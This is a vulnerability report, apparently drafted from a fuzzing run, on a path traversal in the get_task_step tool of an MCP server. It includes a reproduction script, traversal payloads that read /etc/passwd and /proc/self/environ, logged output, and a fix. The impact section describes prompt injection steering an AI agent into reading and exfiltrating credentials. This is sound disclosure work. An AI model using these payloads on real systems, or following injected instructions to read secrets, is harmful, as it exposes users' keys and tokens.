# Path traversal in `get_task_step`: `filePath` and `cwd` let the caller read any file on disk

**Repository:** `d-zero-dev/mcp-server` · **Tool:** `get_task_step` · **Tested commit:** `57bad2e`
**Weakness:** CWE-22 Path Traversal

## Summary
`get_task_step` reads a task file, splits it into steps on `# ` headings, and returns step N. The caller supplies both `cwd` and `filePath`. An absolute `filePath` is used as-is, and a relative one is joined to `cwd` with no containment check. The tool can therefore read any file the server process can read and return its text. A file with no `# ` heading comes back whole as step 1. The fuzzing run read `/etc/passwd` and `/proc/self/environ` this way, and the latter exposes the server's environment variables, including `FIGMA_ACCESS_TOKEN` in the README's configuration.

## Details
`src/index.ts:45-57` at `57bad2e`:

```ts
server.tool(
	'get_task_step',
	'Get task step',
	{
		cwd: z.string().describe('Current working directory (Absolute path)'),
		filePath: z.string().describe('Task file path (Relative to cwd)'),
		step: z.optional(z.number().min(1).int()).describe('Step number (default: 1)'),
	},
	async ({ cwd, filePath, step }) => {
		const content = await getTaskStep(
			path.isAbsolute(filePath) ? filePath : path.join(cwd, filePath),
			step,
		);
```

`getTaskStep` (`src/utils/get-task-step.ts:12-24`) calls `fs.readFile(filePath, 'utf8')` on that path and returns the selected section. Nothing resolves the path or checks it against a project root. `cwd` is caller-controlled too, so a check against `cwd` alone would not help.

## Steps to reproduce
1. Prerequisites: Node.js 20.11 or later (the server uses `import.meta.dirname`). No Figma token is needed for this tool.
2. Install and start the server:
   ```
   git clone https://github.com/d-zero-dev/mcp-server.git
   cd mcp-server && git checkout 57bad2ea498fd720d12079579b22e3ed7a715a54
   npm install && npm run build
   node dist/bin.js
   ```
   (The README's `npx -y @d-zero/mcp-server` runs the latest published version instead.)
3. Call the tool with these arguments:
   ```json
   {"cwd": "/tmp", "filePath": "../etc/hostname", "step": 1}
   ```

   ```python
   import asyncio
   from mcp import ClientSession, StdioServerParameters
   from mcp.client.stdio import stdio_client

   async def main():
       server = StdioServerParameters(command="node", args=["dist/bin.js"])
       async with stdio_client(server) as (read, write):
           async with ClientSession(read, write) as session:
               await session.initialize()
               result = await session.call_tool("get_task_step", {"cwd": "/tmp", "filePath": "../etc/hostname", "step": 1})
               print(result)

   asyncio.run(main())
   ```
   An absolute path works as well: `{"cwd": "/tmp", "filePath": "/etc/hostname"}`.
4. What to observe: the text content is the machine's hostname, the contents of `/etc/hostname` (Linux).

## Expected behavior
The tool should read task files only from a project root the server controls. It should not accept a root from the caller, and it should reject paths that resolve outside that root.

## Actual behavior
The file is read and returned. From the fuzzing run, input `{"cwd": "/home/user", "filePath": "../../../../etc/passwd", "step": 1}` returned (trimmed):

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

With `"filePath": "../../../../proc/self/environ"`, the run returned the server process's full environment.

## Impact
In MCP the LLM fills in `cwd` and `filePath`, and prompt injection can steer them, for example from a Figma file, a web page or a repo file the agent read. A steered call can read any file the user can read, such as SSH keys, `.env` files and cloud credentials. It can also read `/proc/self/environ` on Linux, which holds `FIGMA_ACCESS_TOKEN` when the server runs with the README's configuration. The content lands in the model context, from where other tools or replies can exfiltrate it.

## Suggested fix
- Fix the root on the server side, for example `process.cwd()` at startup or an env var such as `TASK_ROOT`. Stop trusting a caller-supplied `cwd` as a security boundary.
- Resolve and contain: `const target = await fs.realpath(path.resolve(root, filePath))`, then reject unless `target.startsWith(root + path.sep)`. Reject absolute `filePath` values.
- Optionally allow only task-file extensions such as `.md`.

## Status on the default branch
Still present at `57bad2e` (2025-04-18). The tested commit is the head of the default branch.

## Prior reports
None found. Searched the 1 issue and 95 pull requests (fetched 2026-10-01) and the README / docs on the default branch. Almost all PRs are Renovate/Dependabot dependency bumps; the one code PR, #20 "fix: 後続ステップの採番を修正" (PR, closed 2025-06-04), is about step numbering, not paths. README.md does not mention `get_task_step` or any path restriction, and there is no SECURITY.md or `docs/`.

<details>
<summary>Internal notes (remove before filing)</summary>

- ToFu class / sanitizers: path-traversal via `check_path_traversal`, the only sanitizer that fired.
- Campaigns and executions: corpus-sbx 2,560 exec / 117 ok (60 s). e2-0922 1,024 / 25 (60 s).
- Evidence (verbatim, trimmed):
  - input `{'cwd': '/home/user', 'filePath': '../../../../etc/passwd', 'step': 1}` -> `{'content': [{'type': 'text', 'text': 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...'}]}`. This is the sandbox's `/etc/passwd`.
  - input `{'cwd': '/home/user', 'filePath': '../../../../proc/self/environ', 'step': 1}` -> the harness's environment (TOFU_* settings, SSH_CONNECTION, HOME, PATH). It is not pasted here because it contains lab host details.
  - input `... 'step': 2` on `/etc/passwd` -> `全てのステップが完了しました。` ("all steps complete"), since the file has only one step.
- Hand-check hints: real. A caller path reaches `fs.readFile` unchecked, and file contents were returned in the logged run. The `FIGMA_ACCESS_TOKEN` exposure through `/proc/self/environ` is an inference from the README's env-based config plus Linux procfs; the fuzz run had no Figma token set. The Node 20.11 minimum is my reading of `import.meta.dirname` support; package.json has no `engines` field. `/etc/hostname` exists on Linux; on macOS use another harmless file.
</details>
